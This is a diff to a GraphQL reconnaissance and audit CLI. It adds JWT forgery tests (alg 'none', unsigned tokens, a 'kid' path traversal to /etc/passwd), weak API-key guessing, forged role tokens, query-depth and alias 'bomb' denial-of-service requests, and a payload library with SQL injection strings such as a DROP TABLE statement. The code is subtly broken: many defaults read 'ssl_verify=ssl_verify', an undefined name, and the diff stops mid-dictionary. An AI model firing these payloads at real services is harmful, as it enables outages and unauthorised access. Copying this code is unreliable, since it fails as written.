@@ -347,6 +347,50 @@ class GraphQLCacheManager:
     is_flag=True,
     help="Only test URLs that look like GraphQL endpoints",
 )
+# ========== NEW: Advanced Security Testing Options ==========
+@click.option(
+    "--jwt-testing", is_flag=True, help="Enable JWT/API Key authentication testing"
+)
+@click.option(
+    "--dos-testing", is_flag=True, help="Enable DoS/Performance testing suite"
+)
+@click.option(
+    "--payload-library", is_flag=True, help="Use advanced payload library system"
+)
+@click.option(
+    "--custom-payloads", help="Path to custom payload library file (JSON or text)"
+)
+@click.option(
+    "--html-report",
+    is_flag=True,
+    help="Generate enhanced HTML report with risk scoring",
+)
+@click.option(
+    "--risk-assessment", is_flag=True, help="Perform comprehensive risk assessment"
+)
+@click.option(
+    "--compliance-check", is_flag=True, help="Check compliance with security standards"
+)
+@click.option(
+    "--auth-bypass-test",
+    is_flag=True,
+    help="Test for authentication bypass vulnerabilities",
+)
+@click.option(
+    "--role-bypass-test", is_flag=True, help="Test for role-based access control bypass"
+)
+@click.option(
+    "--context-aware",
+    is_flag=True,
+    help="Generate context-aware payloads based on target",
+)
+@click.option("--save-payloads", help="Save payload library to specified file path")
+@click.option("--load-payloads", help="Load payload library from specified file path")
+@click.option(
+    "--security-suite",
+    is_flag=True,
+    help="Enable complete GraphQL security testing suite (all features)",
+)
 def graphqlcli(
     domain,
     url,
@@ -415,8 +459,93 @@ def graphqlcli(
     bulk_test,
     max_urls,
     filter_graphql,
+    # NEW: Advanced Security Testing Parameters
+    jwt_testing,
+    dos_testing,
+    payload_library,
+    custom_payloads,
+    html_report,
+    risk_assessment,
+    compliance_check,
+    auth_bypass_test,
+    role_bypass_test,
+    context_aware,
+    save_payloads,
+    load_payloads,
+    security_suite,
 ):
     """GraphQL recon & audit module using multiple engines and advanced techniques"""
+
+    # ========== Security Suite Mode ==========
+    if security_suite:
+        # Enable all advanced security features
+        jwt_testing = True
+        dos_testing = True
+        payload_library = True
+        html_report = True
+        risk_assessment = True
+        compliance_check = True
+        auth_bypass_test = True
+        role_bypass_test = True
+        context_aware = True
+
+        if verbose:
+            print(
+                "🔒 [SECURITY-SUITE] Complete GraphQL Security Testing Suite activated!"
+            )
+            print("    🔐 JWT/API Key Testing: ENABLED")
+            print("    💥 DoS/Performance Testing: ENABLED")
+            print("    📚 Advanced Payload Library: ENABLED")
+            print("    📊 Enhanced HTML Reporting: ENABLED")
+            print("    🛡️ Risk Assessment: ENABLED")
+            print("    📋 Compliance Checking: ENABLED")
+
+    # ========== Advanced Payload Library System ==========
+    global_payload_library = None
+    if payload_library or load_payloads or security_suite:
+        if verbose:
+            print("📚 [PAYLOAD-LIB] Initializing advanced payload library...")
+
+        if load_payloads and Path(load_payloads).exists():
+            try:
+                with open(load_payloads, "r") as f:
+                    if load_payloads.endswith(".json"):
+                        global_payload_library = json.load(f)
+                    else:
+                        # Text file format
+                        lines = [
+                            line.strip()
+                            for line in f
+                            if line.strip() and not line.startswith("#")
+                        ]
+                        global_payload_library = {"custom_payloads": lines}
+
+                if verbose:
+                    print(
+                        f"📚 [PAYLOAD-LIB] Loaded custom payload library from: {load_payloads}"
+                    )
+            except Exception as e:
+                print(f"⚠️  [PAYLOAD-LIB] Could not load {load_payloads}: {e}")
+                global_payload_library = initialize_payload_library()
+        else:
+            global_payload_library = initialize_payload_library()
+
+        if verbose:
+            if isinstance(global_payload_library, dict):
+                total_payloads = global_payload_library.get("metadata", {}).get(
+                    "total_payloads", 0
+                )
+                print(
+                    f"📚 [PAYLOAD-LIB] Library initialized with {total_payloads} payloads"
+                )
+            else:
+                print(f"📚 [PAYLOAD-LIB] Library initialized with custom payloads")
+
+        # Save payload library if requested
+        if save_payloads:
+            if save_payload_library(global_payload_library, save_payloads):
+                if verbose:
+                    print(f"📚 [PAYLOAD-LIB] Library saved to: {save_payloads}")
 
     # ========== Cache System ==========
     cache_manager = None
@@ -935,10 +1064,43 @@ def graphqlcli(
                     target_url, header, proxy, timeout, verbose, ssl_verify
                 )
 
-        # AI Analysis if requested
+        # ========== NEW: Advanced Security Tests ==========
+
+        # JWT/API Key Testing
+        if jwt_testing or auth_bypass_test or role_bypass_test or security_suite:
+            if verbose:
+                print("🔐 [SECURITY] Running JWT/API Key authentication tests...")
+            results["jwt_auth_testing"] = run_jwt_testing_engine(
+                target_url, header, proxy, timeout, verbose
+            )
+
+        # DoS/Performance Testing
+        if dos_testing or security_suite:
+            if verbose:
+                print("💥 [SECURITY] Running DoS/Performance testing suite...")
+            results["dos_performance_testing"] = run_dos_performance_suite(
+                target_url, header, proxy, timeout, verbose
+            )
+
+        # Context-Aware Payload Generation
+        if context_aware or security_suite:
+            if verbose:
+                print("🎯 [SECURITY] Generating context-aware payloads...")
+
+            # Generate context payloads based on target URL
+            context_payloads = generate_context_payloads(target_url, verbose)
+            if context_payloads:
+                results["context_payloads"] = {
+                    "engine": "context-aware-payloads",
+                    "target": target_url,
+                    "payloads_generated": len(context_payloads),
+                    "payloads": context_payloads[:10],  # Store first 10 for reporting
+                }
+
+        # AI Analysis if requested (enhanced for new features)
         if ai and results:
             if verbose:
-                print(f"🧠 [AI] Running AI analysis with {ai_provider}...")
+                print(f"🧠 [AI] Running enhanced AI analysis with {ai_provider}...")
 
             ai_analysis = run_ai_analysis(
                 target_url, results, ai_provider, ai_context, verbose
@@ -1046,6 +1208,50 @@ def graphqlcli(
             if verbose:
                 click.echo(f"[+] Markdown report saved: {md_output}")
 
+        # ========== NEW: Enhanced HTML Report Generation ==========
+        if html_report or risk_assessment or compliance_check or security_suite:
+            html_output = output_path / f"graphql_security_report_{target_domain}.html"
+
+            if verbose:
+                print("📊 [HTML-REPORT] Generating enhanced HTML security report...")
+
+            if generate_enhanced_html_report(target_url, results, html_output, verbose):
+                if verbose:
+                    print(f"📊 [HTML-REPORT] Enhanced HTML report saved: {html_output}")
+
+            # Generate risk assessment summary
+            if risk_assessment or security_suite:
+                risk_data = calculate_risk_score(results)
+                if verbose:
+                    print(
+                        f"🎯 [RISK] Security Score: {risk_data['score']}/100 ({risk_data['level']})"
+                    )
+                    print(
+                        f"🎯 [RISK] Vulnerabilities: {risk_data['vulnerabilities_found']}"
+                    )
+                    print(f"🎯 [RISK] Critical Issues: {risk_data['critical_issues']}")
+
+                # Save risk assessment data
+                risk_file = output_path / f"risk_assessment_{target_domain}.json"
+                risk_file.write_text(json.dumps(risk_data, indent=2))
+
+            # Generate compliance report
+            if compliance_check or security_suite:
+                compliance_data = generate_compliance_mapping(results)
+                if verbose:
+                    print(
+                        f"📋 [COMPLIANCE] Overall Compliance: {compliance_data['overall_compliance']}%"
+                    )
+                    print(
+                        f"📋 [COMPLIANCE] Checks Passed: {compliance_data['passed_checks']}/{compliance_data['total_checks']}"
+                    )
+
+                # Save compliance data
+                compliance_file = (
+                    output_path / f"compliance_report_{target_domain}.json"
+                )
+                compliance_file.write_text(json.dumps(compliance_data, indent=2))
+
         # Store results for this target
         all_results[target_url] = results
 
@@ -1093,17 +1299,32 @@ def run_ai_analysis(target_url, results, ai_provider, ai_context, verbose):
     try:
         # Import AI libraries based on provider
         if ai_provider == "openai":
-            import openai
+            try:
+                import openai
 
-            client = openai.OpenAI()
+                client = openai.OpenAI()
+            except ImportError:
+                return {
+                    "error": "OpenAI library not installed. Install with: pip install openai"
+                }
         elif ai_provider == "anthropic":
-            import anthropic
+            try:
+                import anthropic
 
-            client = anthropic.Anthropic()
+                client = anthropic.Anthropic()
+            except ImportError:
+                return {
+                    "error": "Anthropic library not installed. Install with: pip install anthropic"
+                }
         elif ai_provider == "gemini":
-            import google.generativeai as genai
+            try:
+                import google.generativeai as genai
 
-            client = genai
+                client = genai
+            except ImportError:
+                return {
+                    "error": "Google Generative AI library not installed. Install with: pip install google-generativeai"
+                }
         else:
             return {"error": f"Unsupported AI provider: {ai_provider}"}
 
@@ -1178,11 +1399,6 @@ Format as JSON with these keys: risk_level, vulnerabilities, attack_vectors, rec
 
         return analysis
 
-    except ImportError:
-        return {
-            "error": f"AI provider '{ai_provider}' library not installed",
-            "install_hint": f"pip install {ai_provider}",
-        }
     except Exception as e:
         return {"error": f"AI analysis failed: {str(e)}", "provider": ai_provider}
 
@@ -1260,7 +1476,7 @@ def format_output(results, output_format, verbose):
         return "\n".join(output)
 
 
-def dump_schema_json(target_url, headers, proxy, verbose, ssl_verify=True):
+def dump_schema_json(target_url, headers, proxy, verbose, ssl_verify=ssl_verify):
     """Dump GraphQL schema to JSON using introspection query"""
 
     header_dict = {}
@@ -1513,7 +1729,7 @@ def run_graphqlmap_enhanced(
     endpoint=None,
     timeout=30,
     verbose=False,
-    ssl_verify=True,
+    ssl_verify=ssl_verify,
 ):
     """Enhanced wrapper for run_graphqlmap with URL support"""
     from urllib.parse import urlparse
@@ -1549,7 +1765,7 @@ def run_graphqlcop_enhanced(
 
 
 def run_graphw00f(
-    domain, headers, proxy, fingerprint, detect_engines, verbose, ssl_verify=True
+    domain, headers, proxy, fingerprint, detect_engines, verbose, ssl_verify=ssl_verify
 ):
     """Run GraphW00F fingerprinting tool"""
     url = f"https://{domain}/graphql"
@@ -1608,7 +1824,7 @@ def run_graphw00f(
         return {"engine": "graphw00f", "url": url, "error": str(e)}
 
 
-def manual_graphql_fingerprinting(domain, headers, proxy, verbose, ssl_verify=True):
+def manual_graphql_fingerprinting(domain, headers, proxy, verbose, ssl_verify=ssl_verify):
     """Manual GraphQL fingerprinting implementation"""
     url = f"https://{domain}/graphql"
 
@@ -1847,7 +2063,7 @@ def run_graphqlcop(
 
 
 def run_graphqlmap(
-    domain, headers, proxy, endpoint=None, timeout=30, verbose=False, ssl_verify=True
+    domain, headers, proxy, endpoint=None, timeout=30, verbose=False, ssl_verify=ssl_verify
 ):
     """Enhanced GraphQLMap with interactive mode simulation"""
     if endpoint:
@@ -1903,7 +2119,7 @@ def run_graphqlmap(
 
 
 def test_graphqlmap_introspection(
-    url, headers, proxy, timeout, verbose, ssl_verify=True
+    url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify
 ):
     """Test GraphQL introspection manually"""
     header_dict = {}
@@ -1935,7 +2151,7 @@ def test_graphqlmap_introspection(
         return {"error": str(e)}
 
 
-def test_graphqlmap_debug(url, headers, proxy, timeout, verbose, ssl_verify=True):
+def test_graphqlmap_debug(url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify):
     """Test GraphQL debug information"""
     header_dict = {}
     for h in headers:
@@ -1966,7 +2182,7 @@ def test_graphqlmap_debug(url, headers, proxy, timeout, verbose, ssl_verify=True
 
 
 def run_threat_matrix_assessment(
-    url, headers, proxy, timeout, verbose, ssl_verify=True
+    url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify
 ):
     """Run GraphQL Threat Matrix assessment"""
     if verbose:
@@ -2006,7 +2222,7 @@ def run_threat_matrix_assessment(
     }
 
 
-def test_introspection_threat(url, headers, proxies, timeout, ssl_verify=True):
+def test_introspection_threat(url, headers, proxies, timeout, ssl_verify=ssl_verify):
     """Test for introspection vulnerability"""
     query = {"query": "{ __schema { queryType { name } } }"}
     try:
@@ -2027,7 +2243,7 @@ def test_introspection_threat(url, headers, proxies, timeout, ssl_verify=True):
         return {"error": str(e), "vulnerable": False}
 
 
-def test_deep_recursion_threat(url, headers, proxies, timeout, ssl_verify=True):
+def test_deep_recursion_threat(url, headers, proxies, timeout, ssl_verify=ssl_verify):
     """Test for deep recursion DoS"""
     deep_query = {"query": "{ " + "user { user { " * 50 + "id" + " } }" * 50 + " }"}
     try:
@@ -2051,7 +2267,7 @@ def test_deep_recursion_threat(url, headers, proxies, timeout, ssl_verify=True):
         return {"error": str(e), "vulnerable": False}
 
 
-def test_field_duplication_threat(url, headers, proxies, timeout, ssl_verify=True):
+def test_field_duplication_threat(url, headers, proxies, timeout, ssl_verify=ssl_verify):
     """Test for field duplication DoS"""
     duplicate_query = {"query": "{ " + "__typename " * 1000 + " }"}
     try:
@@ -2075,7 +2291,7 @@ def test_field_duplication_threat(url, headers, proxies, timeout, ssl_verify=Tru
         return {"error": str(e), "vulnerable": False}
 
 
-def test_alias_overload_threat(url, headers, proxies, timeout, ssl_verify=True):
+def test_alias_overload_threat(url, headers, proxies, timeout, ssl_verify=ssl_verify):
     """Test for alias overload DoS"""
     alias_query = {
         "query": "{ " + " ".join([f"alias{i}: __typename" for i in range(1000)]) + " }"
@@ -2101,7 +2317,7 @@ def test_alias_overload_threat(url, headers, proxies, timeout, ssl_verify=True):
         return {"error": str(e), "vulnerable": False}
 
 
-def test_directive_overload_threat(url, headers, proxies, timeout, ssl_verify=True):
+def test_directive_overload_threat(url, headers, proxies, timeout, ssl_verify=ssl_verify):
     """Test for directive overload DoS"""
     directive_query = {"query": "{ __typename " + "@include(if: true) " * 1000 + " }"}
     try:
@@ -2125,7 +2341,7 @@ def test_directive_overload_threat(url, headers, proxies, timeout, ssl_verify=Tr
         return {"error": str(e), "vulnerable": False}
 
 
-def test_batch_queries(url, headers, proxy, timeout, verbose, ssl_verify=True):
+def test_batch_queries(url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify):
     """Test GraphQL batching capabilities"""
     if verbose:
         click.echo("[+] Testing GraphQL batching...")
@@ -2168,7 +2384,7 @@ def test_batch_queries(url, headers, proxy, timeout, verbose, ssl_verify=True):
     return {"test_type": "batch_queries", "url": url, "results": batch_tests}
 
 
-def test_sql_injection(url, headers, proxy, timeout, verbose, ssl_verify=True):
+def test_sql_injection(url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify):
     """Test for SQL injection vulnerabilities"""
     if verbose:
         click.echo("[+] Testing SQL injection...")
@@ -2230,7 +2446,7 @@ def test_sql_injection(url, headers, proxy, timeout, verbose, ssl_verify=True):
     return {"test_type": "sql_injection", "url": url, "results": injection_tests}
 
 
-def test_nosql_injection(url, headers, proxy, timeout, verbose, ssl_verify=True):
+def test_nosql_injection(url, headers, proxy, timeout, verbose, ssl_verify=ssl_verify):
     """Test for NoSQL injection vulnerabilities"""
     if verbose:
         click.echo("[+] Testing NoSQL injection...")
@@ -2614,6 +2830,1231 @@ def parse_graphql_schema_info(schema_text):
     return info
 
 
+# ========== JWT/API Key Testing Engine ==========
+
+
+def run_jwt_testing_engine(target_url, headers, proxy, timeout, verbose):
+    """Advanced JWT/API Key Testing Engine"""
+    if verbose:
+        print("🔐 [JWT-AUTH] Starting JWT/API Key Testing Engine...")
+
+    results = {
+        "engine": "jwt-auth-testing",
+        "target": target_url,
+        "timestamp": datetime.utcnow().isoformat(),
+        "jwt_tests": {},
+        "api_key_tests": {},
+        "auth_bypass_tests": {},
+        "role_tests": {},
+    }
+
+    # JWT Token Tests
+    jwt_payloads = [
+        {"alg": "none"},  # None algorithm attack
+        {"alg": "HS256", "typ": "JWT"},  # Standard JWT
+        {"alg": "RS256", "typ": "JWT"},  # RSA signature
+        {"alg": "HS256", "typ": "JWT", "kid": "../../../etc/passwd"},  # Path traversal
+    ]
+
+    # Test JWT manipulation
+    for i, payload in enumerate(jwt_payloads):
+        test_name = f"jwt_test_{i+1}"
+        try:
+            # Create test JWT
+            import base64
+            import json
+
+            # Create header and payload
+            header_b64 = (
+                base64.urlsafe_b64encode(json.dumps(payload).encode())
+                .decode()
+                .rstrip("=")
+            )
+            test_payload = {"sub": "test", "iat": 1234567890, "exp": 9999999999}
+            payload_b64 = (
+                base64.urlsafe_b64encode(json.dumps(test_payload).encode())
+                .decode()
+                .rstrip("=")
+            )
+
+            # Test without signature (none alg)
+            if payload.get("alg") == "none":
+                test_jwt = f"{header_b64}.{payload_b64}."
+            else:
+                test_jwt = f"{header_b64}.{payload_b64}.fake_signature"
+
+            # Test with GraphQL
+            graphql_query = {
+                "query": "{ __schema { queryType { name } } }",
+                "variables": {},
+            }
+
+            test_headers = dict(headers) if isinstance(headers, dict) else {}
+            test_headers["Authorization"] = f"Bearer {test_jwt}"
+
+            response = requests.post(
+                target_url,
+                json=graphql_query,
+                headers=test_headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            results["jwt_tests"][test_name] = {
+                "jwt_type": payload.get("alg", "unknown"),
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "auth_bypassed": response.status_code == 200
+                and "__schema" in response.text,
+                "test_jwt": test_jwt[:50] + "...",
+            }
+
+            if verbose and results["jwt_tests"][test_name]["auth_bypassed"]:
+                print(
+                    f"⚠️  [JWT-AUTH] Potential bypass with {payload.get('alg')} algorithm"
+                )
+
+        except Exception as e:
+            results["jwt_tests"][test_name] = {"error": str(e)}
+
+    # API Key Testing
+    api_key_locations = [
+        {"location": "header", "name": "X-API-Key"},
+        {"location": "header", "name": "API-Key"},
+        {"location": "header", "name": "Authorization"},
+        {"location": "query", "name": "api_key"},
+        {"location": "query", "name": "key"},
+        {"location": "query", "name": "token"},
+    ]
+
+    test_api_keys = [
+        "test_key_123",
+        "admin",
+        "guest",
+        "development",
+        "null",
+        "",
+        "12345",
+        "test",
+    ]
+
+    for location_info in api_key_locations:
+        for api_key in test_api_keys:
+            test_name = f"api_{location_info['location']}_{location_info['name']}_{api_key[:10]}"
+
+            try:
+                graphql_query = {"query": "{ __schema { queryType { name } } }"}
+
+                if location_info["location"] == "header":
+                    test_headers = dict(headers) if isinstance(headers, dict) else {}
+                    test_headers[location_info["name"]] = api_key
+                    test_url = target_url
+                else:  # query parameter
+                    test_headers = dict(headers) if isinstance(headers, dict) else {}
+                    test_url = f"{target_url}?{location_info['name']}={api_key}"
+
+                response = requests.post(
+                    test_url,
+                    json=graphql_query,
+                    headers=test_headers,
+                    proxies={"http": proxy, "https": proxy} if proxy else None,
+                    timeout=timeout,
+                    verify=ssl_verify,
+                )
+
+                results["api_key_tests"][test_name] = {
+                    "location": location_info["location"],
+                    "header_name": location_info["name"],
+                    "api_key": api_key,
+                    "status_code": response.status_code,
+                    "response_size": len(response.text),
+                    "auth_bypassed": response.status_code == 200
+                    and "__schema" in response.text,
+                }
+
+                if verbose and results["api_key_tests"][test_name]["auth_bypassed"]:
+                    print(
+                        f"⚠️  [API-KEY] Potential bypass with {location_info['name']}={api_key}"
+                    )
+
+            except Exception as e:
+                results["api_key_tests"][test_name] = {"error": str(e)}
+
+    # Role-Based Access Control Tests
+    role_tests = [
+        {"role": "admin", "user": "admin"},
+        {"role": "guest", "user": "guest"},
+        {"role": "user", "user": "test"},
+        {"role": "dev", "user": "developer"},
+        {"role": "null", "user": "null"},
+    ]
+
+    for role_test in role_tests:
+        test_name = f"role_{role_test['role']}"
+
+        try:
+            # Create role-based payload
+            role_payload = {
+                "sub": role_test["user"],
+                "role": role_test["role"],
+                "permissions": (
+                    ["read", "write"] if role_test["role"] == "admin" else ["read"]
+                ),
+                "iat": 1234567890,
+                "exp": 9999999999,
+            }
+
+            # Simple base64 encoding (for testing purposes)
+            import base64
+            import json
+
+            header_b64 = (
+                base64.urlsafe_b64encode(
+                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+                )
+                .decode()
+                .rstrip("=")
+            )
+            payload_b64 = (
+                base64.urlsafe_b64encode(json.dumps(role_payload).encode())
+                .decode()
+                .rstrip("=")
+            )
+            test_jwt = f"{header_b64}.{payload_b64}.fake_signature"
+
+            graphql_query = {"query": "{ __schema { queryType { name } } }"}
+
+            test_headers = dict(headers) if isinstance(headers, dict) else {}
+            test_headers["Authorization"] = f"Bearer {test_jwt}"
+
+            response = requests.post(
+                target_url,
+                json=graphql_query,
+                headers=test_headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            results["role_tests"][test_name] = {
+                "role": role_test["role"],
+                "user": role_test["user"],
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "auth_bypassed": response.status_code == 200
+                and "__schema" in response.text,
+                "test_jwt": test_jwt[:50] + "...",
+            }
+
+            if verbose and results["role_tests"][test_name]["auth_bypassed"]:
+                print(f"⚠️  [ROLE] Potential role bypass with {role_test['role']} role")
+
+        except Exception as e:
+            results["role_tests"][test_name] = {"error": str(e)}
+
+    if verbose:
+        total_jwt_tests = len(results["jwt_tests"])
+        total_api_tests = len(results["api_key_tests"])
+        total_role_tests = len(results["role_tests"])
+        print(
+            f"🔐 [JWT-AUTH] Completed: {total_jwt_tests} JWT + {total_api_tests} API key + {total_role_tests} role tests"
+        )
+
+    return results
+
+
+# ========== DoS/Performance Testing Suite ==========
+
+
+def run_dos_performance_suite(target_url, headers, proxy, timeout, verbose):
+    """Advanced DoS/Performance Testing Suite"""
+    if verbose:
+        print("💥 [DOS-PERF] Starting DoS/Performance Testing Suite...")
+
+    results = {
+        "engine": "dos-performance-testing",
+        "target": target_url,
+        "timestamp": datetime.utcnow().isoformat(),
+        "query_depth_tests": {},
+        "alias_bomb_tests": {},
+        "fragment_abuse_tests": {},
+        "complexity_tests": {},
+        "recursive_tests": {},
+    }
+
+    # Query Depth Bomb Tests
+    depth_levels = [5, 10, 20, 50, 100]
+
+    for depth in depth_levels:
+        test_name = f"depth_bomb_{depth}"
+
+        try:
+            # Create deep recursive query
+            deep_query = "{ " + "user { " * depth + "id" + " }" * depth + " }"
+
+            import time
+
+            start_time = time.time()
+
+            response = requests.post(
+                target_url,
+                json={"query": deep_query},
+                headers=headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            response_time = time.time() - start_time
+
+            results["query_depth_tests"][test_name] = {
+                "depth_level": depth,
+                "query_size": len(deep_query),
+                "response_time": round(response_time, 3),
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "potential_dos": response_time > 5.0 or response.status_code >= 500,
+                "error_indicators": (
+                    ["timeout", "error", "limit"]
+                    if any(
+                        word in response.text.lower()
+                        for word in ["timeout", "error", "limit"]
+                    )
+                    else []
+                ),
+            }
+
+            if verbose:
+                status = (
+                    "⚠️  VULNERABLE"
+                    if results["query_depth_tests"][test_name]["potential_dos"]
+                    else "✅ Safe"
+                )
+                print(f"💥 [DOS-PERF] Depth {depth}: {status} ({response_time:.2f}s)")
+
+        except requests.exceptions.Timeout:
+            results["query_depth_tests"][test_name] = {
+                "depth_level": depth,
+                "response_time": timeout,
+                "status_code": "TIMEOUT",
+                "potential_dos": True,
+                "timeout": True,
+            }
+            if verbose:
+                print(f"💥 [DOS-PERF] Depth {depth}: ⚠️  TIMEOUT (potential DoS)")
+        except Exception as e:
+            results["query_depth_tests"][test_name] = {
+                "depth_level": depth,
+                "error": str(e),
+            }
+
+    # Alias Bomb Tests
+    alias_counts = [10, 50, 100, 500, 1000]
+
+    for count in alias_counts:
+        test_name = f"alias_bomb_{count}"
+
+        try:
+            # Create alias bomb query
+            aliases = [f"alias{i}: __typename" for i in range(count)]
+            alias_query = "{ " + " ".join(aliases) + " }"
+
+            start_time = time.time()
+
+            response = requests.post(
+                target_url,
+                json={"query": alias_query},
+                headers=headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            response_time = time.time() - start_time
+
+            results["alias_bomb_tests"][test_name] = {
+                "alias_count": count,
+                "query_size": len(alias_query),
+                "response_time": round(response_time, 3),
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "potential_dos": response_time > 3.0 or response.status_code >= 500,
+            }
+
+            if verbose:
+                status = (
+                    "⚠️  VULNERABLE"
+                    if results["alias_bomb_tests"][test_name]["potential_dos"]
+                    else "✅ Safe"
+                )
+                print(f"💥 [DOS-PERF] Alias {count}: {status} ({response_time:.2f}s)")
+
+        except requests.exceptions.Timeout:
+            results["alias_bomb_tests"][test_name] = {
+                "alias_count": count,
+                "response_time": timeout,
+                "status_code": "TIMEOUT",
+                "potential_dos": True,
+                "timeout": True,
+            }
+        except Exception as e:
+            results["alias_bomb_tests"][test_name] = {
+                "alias_count": count,
+                "error": str(e),
+            }
+
+    # Fragment Abuse Tests
+    fragment_counts = [5, 10, 20, 50]
+
+    for count in fragment_counts:
+        test_name = f"fragment_abuse_{count}"
+
+        try:
+            # Create fragment abuse query
+            fragments = []
+            for i in range(count):
+                fragments.append(f"fragment frag{i} on Query {{ __typename }}")
+
+            fragment_query = (
+                " ".join(fragments)
+                + " query { "
+                + " ".join([f"...frag{i}" for i in range(count)])
+                + " }"
+            )
+
+            start_time = time.time()
+
+            response = requests.post(
+                target_url,
+                json={"query": fragment_query},
+                headers=headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            response_time = time.time() - start_time
+
+            results["fragment_abuse_tests"][test_name] = {
+                "fragment_count": count,
+                "query_size": len(fragment_query),
+                "response_time": round(response_time, 3),
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "potential_dos": response_time > 4.0 or response.status_code >= 500,
+            }
+
+            if verbose:
+                status = (
+                    "⚠️  VULNERABLE"
+                    if results["fragment_abuse_tests"][test_name]["potential_dos"]
+                    else "✅ Safe"
+                )
+                print(
+                    f"💥 [DOS-PERF] Fragment {count}: {status} ({response_time:.2f}s)"
+                )
+
+        except requests.exceptions.Timeout:
+            results["fragment_abuse_tests"][test_name] = {
+                "fragment_count": count,
+                "response_time": timeout,
+                "status_code": "TIMEOUT",
+                "potential_dos": True,
+                "timeout": True,
+            }
+        except Exception as e:
+            results["fragment_abuse_tests"][test_name] = {
+                "fragment_count": count,
+                "error": str(e),
+            }
+
+    # Complexity Analysis Tests
+    complexity_queries = [
+        {"name": "simple", "query": "{ __typename }", "expected_complexity": 1},
+        {
+            "name": "moderate",
+            "query": "{ __schema { types { name fields { name } } } }",
+            "expected_complexity": 10,
+        },
+        {
+            "name": "complex",
+            "query": "{ __schema { types { name fields { name type { name ofType { name } } } } } }",
+            "expected_complexity": 50,
+        },
+        {
+            "name": "very_complex",
+            "query": "{ __schema { types { name fields { name type { name ofType { name ofType { name } } } args { name type { name } } } } } }",
+            "expected_complexity": 100,
+        },
+    ]
+
+    for query_info in complexity_queries:
+        test_name = f"complexity_{query_info['name']}"
+
+        try:
+            start_time = time.time()
+
+            response = requests.post(
+                target_url,
+                json={"query": query_info["query"]},
+                headers=headers,
+                proxies={"http": proxy, "https": proxy} if proxy else None,
+                timeout=timeout,
+                verify=ssl_verify,
+            )
+
+            response_time = time.time() - start_time
+
+            # Calculate complexity score based on query structure
+            complexity_score = (
+                query_info["query"].count("{") * 2
+                + query_info["query"].count("type") * 3
+                + query_info["query"].count("ofType") * 5
+                + len(query_info["query"].split()) * 0.1
+            )
+
+            results["complexity_tests"][test_name] = {
+                "complexity_name": query_info["name"],
+                "calculated_complexity": round(complexity_score, 2),
+                "expected_complexity": query_info["expected_complexity"],
+                "query_size": len(query_info["query"]),
+                "response_time": round(response_time, 3),
+                "status_code": response.status_code,
+                "response_size": len(response.text),
+                "performance_ratio": (
+                    round(response_time / (complexity_score / 10), 3)
+                    if complexity_score > 0
+                    else 0
+                ),
+            }
+
+            if verbose:
+                print(
+                    f"💥 [DOS-PERF] Complexity {query_info['name']}: {complexity_score:.1f} score, {response_time:.2f}s"
+                )
+
+        except Exception as e:
+            results["complexity_tests"][test_name] = {
+                "complexity_name": query_info["name"],
+                "error": str(e),
+            }
+
+    if verbose:
+        total_depth_tests = len(results["query_depth_tests"])
+        total_alias_tests = len(results["alias_bomb_tests"])
+        total_fragment_tests = len(results["fragment_abuse_tests"])
+        total_complexity_tests = len(results["complexity_tests"])
+        print(
+            f"💥 [DOS-PERF] Completed: {total_depth_tests} depth + {total_alias_tests} alias + {total_fragment_tests} fragment + {total_complexity_tests} complexity tests"
+        )
+
+    return results
+
+
+# ========== Advanced Payload Library System ==========
+
+
+def initialize_payload_library():
+    """Initialize comprehensive GraphQL payload library"""
+    payload_library = {
+        "metadata": {
+            "version": "1.0.0",
+            "created": datetime.utcnow().isoformat(),
+            "total_payloads": 0,
+            "categories": [],
+        },
+        "introspection": {
+            "basic": [
+                "{ __schema { queryType { name } } }",
+                "{ __schema { mutationType { name } } }",
+                "{ __schema { subscriptionType { name } } }",
+                "{ __typename }",
+            ],
+            "detailed": [
+                "{ __schema { types { name kind description } } }",
+                "{ __schema { types { name fields { name type { name } } } } }",
+                "{ __schema { queryType { fields { name description args { name type { name } } } } } }",
+                "{ __schema { mutationType { fields { name description args { name type { name } } } } } }",
+            ],
+            "full": [
+                """query IntrospectionQuery {
+                  __schema {
+                    queryType { name }
+                    mutationType { name }
+                    subscriptionType { name }
+                    types {
+                      ...FullType
+                    }
+                    directives {
+                      name
+                      description
+                      locations
+                      args {
+                        ...InputValue
+                      }
+                    }
+                  }
+                }
+                fragment FullType on __Type {
+                  kind
+                  name
+                  description
+                  fields(includeDeprecated: true) {
+                    name
+                    description
+                    args { ...InputValue }
+                    type { ...TypeRef }
+                    isDeprecated
+                    deprecationReason
+                  }
+                  inputFields { ...InputValue }
+                  interfaces { ...TypeRef }
+                  enumValues(includeDeprecated: true) {
+                    name
+                    description
+                    isDeprecated
+                    deprecationReason
+                  }
+                  possibleTypes { ...TypeRef }
+                }
+                fragment InputValue on __InputValue {
+                  name
+                  description
+                  type { ...TypeRef }
+                  defaultValue
+                }
+                fragment TypeRef on __Type {
+                  kind
+                  name
+                  ofType {
+                    kind
+                    name
+                    ofType {
+                      kind
+                      name
+                      ofType {
+                        kind
+                        name
+                      }
+                    }
+                  }
+                }"""
+            ],
+        },
+        "injection": {
+            "sql": [
+                "{ user(id: \"1' OR '1'='1\") { id name } }",
+                '{ user(id: "\'; DROP TABLE users; --") { id name } }',
+                '{ user(id: "\' UNION SELECT version() --") { id name } }',
+                '{ user(id: "1\' AND 1=1 --") { id name } }',
+                '{ user(id: "1\' AND 1=2 --") { id name } }',
+            ],
+            "nosql": [
